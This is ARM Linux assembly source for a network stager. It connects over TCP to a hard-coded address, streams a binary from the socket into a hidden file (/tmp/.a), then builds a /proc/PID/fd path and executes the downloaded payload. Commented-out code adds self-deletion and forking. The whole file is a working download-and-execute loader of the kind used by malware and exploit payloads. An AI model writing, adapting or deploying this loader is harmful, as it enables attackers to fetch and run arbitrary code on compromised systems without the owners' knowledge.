	.text
	.globl _start
_start:
	# unlink
	#mov r7, $10    @ unlink
	#mov r0, r1     @ argv[0]
	#svc $0

	# if (!fork) exit
	#mov r7, $2    @ fork
	#svc #0
	#cmp r0, $0
	#bne end
	#mov r10,r0  @ Store PID for later
	
	# Socket
	mov r7, $281  @ socket
	mov r0, $2    @ AF_INET = 2
	mov r1, $1    @ SOCK_STREAM = 1
	mov r2, $6    @ IPPROTO_TCP = 6
	svc #0        @ s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov r8, r0    @ r8 = s

	# Connect
	mov r7, $283  @ Connect
	mov r0, r8
	ldr r1, =addr
	mov r2, $16
	svc #0

	#  memfd_create
	mov r7, $5   @ OPEN
	ldr r0, =fname
	# mov r1, $101
	#mov r1, $0x242
	ldr r1, =$0x101242
	mov r2, $511
	svc #0
	mov r9, r0 @ r9 = fd

	# Call open on /dev/shm/.a	
	cmp r0, $0
	ble end0    @ End on error
	
	mov r1, sp
	sub r1, r1, $1024  @ Use the stack as buffer

xfer0:	
	# Read from socket
	mov r7, $3    @ read
	mov r0, r8
	mov r2, $1024
	svc #0
	cmp r0, $0
	ble done      @ XXX: Check for partial reads to finish

	mov r2, r0
	mov r7, $4    @ write
	mov r0, r9
	svc #0

	b xfer0
done:	
	# close socket
	mov r7, $6 @ Socket
	mov r0, r8
	svc #0

#	mov r7, $6 @ File
#	mov r0, r9
#	svc #0

#	mov r10, r1
#	mov r7, $5    @ OPEN
#	ldr r0, =fname
#	mov r1, $0    @ O_RDONLY
#	mov r2, $511  
#	svc #0
#	mov r9, r0    @ r9 = fd
#	mov r1, r10

	mov r7, $118    @ fsync
	mov r0, r9
	svc #0
	
	# End of file transfer
	# --------------------------------
	# Build /proc/pid/fd/FD on r1
	# FD in r9
	# get pid
	
	mov r7, $20         @ getpid
	svc #0
	mov r10, r0         @ r10 <= PID

	mov r6, r1
	# Copy /proc/
	ldr r2, =d
	ldr r3,[r2],$4          @ Get first divisor as a word

	# input first part of the string
	ldr  r4, =$0x6f72702f
	str r4, [r6], $4
	
	mov r4, $0x2f63
	str r4, [r6], $2

	eor r4, r4           @ Initialise digit to 0
	eor r5, r5
	
	# Variables
	# r2 <- Divisor Array
	# r3 <- Current Divisor
	# r4 <- Current digit being calculator (quote)
	# r5 <- Print flag
	# r6 <- Buffer
	# r10 <- PID (reminder PID)
	 
loop1:
	cmp r3, $0            @ Did we reached the last divisor?
	beq end1
loop2:
	cmp r10, r3
	bge end2            @ If divident > divisor... add 1 to digit

	ldr r3, [r2], $4
	cmp r5, $0
	beq cont02
	add r4, r4, $48      @ ASCII Value for '0'
	strb r4, [r6], $1
cont02:	
	eor r4,r4            @ Reset current digit
	b loop2
end2:

	mov r5, $1           @ Set print flag
	sub r10, r10, r3
	add r4, r4, $1

	b loop1

end1:
	ldr  r4, = 0x2f64662f
	str  r4, [r6], $4
	add  r4, r9, $0x30
	strb r4,[r6], $1
	# Add file discriptor
	#mov r4, $0x302f
	#add r4, r4, r9, lsl $8
	#str r4, [r6], $2

	mov r4, $0
	strb r4, [r6]
	

#	mov r7, $6 @ Socket
#	mov r0, r9
#	svc #0

#	mov r8, r1   @ Store stack buffer
	
#	mov r7, $5   @ OPEN
#	ldr r0, =fname
#	mov r1, $102
#	mov r2, $511
	#ldr r2, =511
#	svc #0

	
#	mov r0, $1
#	sub r2, r6, r1
#	mov r7, $4
#	svc #0

	# exec
	mov r7, $11     @ exec
	#	mov r0, r8
	mov r0, r1
	eor r1, r1      @ argp
	eor r2, r2      @ envp
	svc #0
	bl end


	
end0:	mov r0,$41
end:	mov r7, $1      @exit
	;; 	eor r0,r0

	svc #0

print:
	push {r0, r1, r2}
	mov r0, $1
	ldr r1, =shell
	mov r2, $11
	mov r7, $4
	svc #0
	pop {r0, r1, r2}
	bx lr
	
shell:
        .asciz "/bin/bash\n"
#fname:	.asciz "/dev/shm/.a"
fname:	.asciz "/tmp/.a"
addr:	.quad 0x0100007f11110002
d:	.word 10000, 1000, 100, 10, 1, 0,0
